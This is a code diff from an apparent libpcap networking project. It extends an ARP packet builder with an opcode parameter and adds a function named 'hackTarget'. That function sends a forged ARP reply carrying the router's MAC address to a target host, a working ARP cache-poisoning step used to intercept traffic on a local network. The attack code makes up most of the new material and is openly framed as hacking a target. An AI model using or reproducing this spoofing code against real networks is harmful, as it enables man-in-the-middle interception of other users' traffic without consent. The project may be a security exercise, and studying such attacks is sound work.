@@ -49,7 +49,7 @@ uint8_t * getRouterIPAddress(void) {
     return ip;
 }
 
-u_char * makeArpPacket(u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uint8_t * des_ip) {
+u_char * makeArpPacket(u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uint8_t * des_ip, int opcode = 1) {
     struct ether_header * ether_hdr = (struct ether_header *)malloc(sizeof(struct ether_header));
 
     memcpy(ether_hdr -> ether_shost, src_mac, ETHER_ADDR_LEN);
@@ -62,7 +62,7 @@ u_char * makeArpPacket(u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uin
     req -> ea_hdr.ar_pro = htons(ETHERTYPE_IP);
     req -> ea_hdr.ar_hln = ETHER_ADDR_LEN;
     req -> ea_hdr.ar_pln = 4;
-    req -> ea_hdr.ar_op = htons(1);
+    req -> ea_hdr.ar_op = htons(opcode);
 
     for(int i = 0; i < ETHER_ADDR_LEN; i++) {
         des_mac[i] = 0;
@@ -98,7 +98,7 @@ u_char * getSenderMacAddress(char * dev) {
                 // MAC address
                 if (if_addr->ifa_addr != NULL && if_addr->ifa_addr->sa_family == AF_LINK) {
                     struct sockaddr_dl* sdl = (struct sockaddr_dl *)if_addr->ifa_addr;
-                    u_char * mac = (uint8_t *)malloc(sizeof(uint8_t) * ETHER_ADDR_LEN);
+                    u_char * mac = (u_char *)malloc(sizeof(u_char) * ETHER_ADDR_LEN);
                     if (ETHER_ADDR_LEN == sdl->sdl_alen) {
                         memcpy(mac, LLADDR(sdl), sdl->sdl_alen);
                         printf("mac  : %02x:%02x:%02x:%02x:%02x:%02x\n\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
@@ -133,4 +133,12 @@ u_char * getTargetMacAddress(pcap_t* handle, u_char * sender_mac_address, uint8_
         if(target_mac_address) return target_mac_address;
     }
     return NULL;
+}
+
+
+void hackTarget(pcap_t * handle, u_char * router_mac_address, u_char * target_mac_address, uint8_t * src_ip, uint8_t * des_ip) {
+    u_char * packet = makeArpPacket(router_mac_address, target_mac_address, src_ip, des_ip, 2);
+    pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp));
+
+    printf("Success");
 }
